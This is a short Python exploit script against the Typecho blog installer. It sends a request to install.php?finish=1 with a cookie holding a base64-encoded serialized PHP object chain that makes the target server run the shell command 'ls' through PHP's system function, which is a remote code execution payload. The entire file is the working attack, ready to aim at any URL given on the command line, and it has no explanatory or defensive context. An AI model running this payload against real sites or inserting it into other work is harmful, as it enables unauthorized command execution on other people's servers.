import sys
import requests


class Typecho_install_getshell_Test:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",
            "Cookie": "__typecho_config=YToxOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6NTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6MjoibHMiO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6Njoic3lzdGVtIjt9fXM6NDoibGluayI7czo0OiJsaW5rIjtzOjU6InRpdGxlIjtzOjU6InRpdGxlIjtzOjQ6ImRhdGUiO3M6NDoiZGF0ZSI7czo4OiJjYXRlZ29yeSI7YToxOntpOjA7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czoyOiJscyI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJzeXN0ZW0iO319fX19czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjt9fQ==",
            "Referer": self.url,
        }
        vulnpath = self.url + "/install.php?finish=1"
        res = requests.get(vulnpath, headers=headers, timeout=10)
        print(res)
        requests.get(self.url + "/install.php?finish", timeout=10)


if __name__ == "__main__":
    Vuln = Typecho_install_getshell_Test(sys.argv[1])
    Vuln.run()
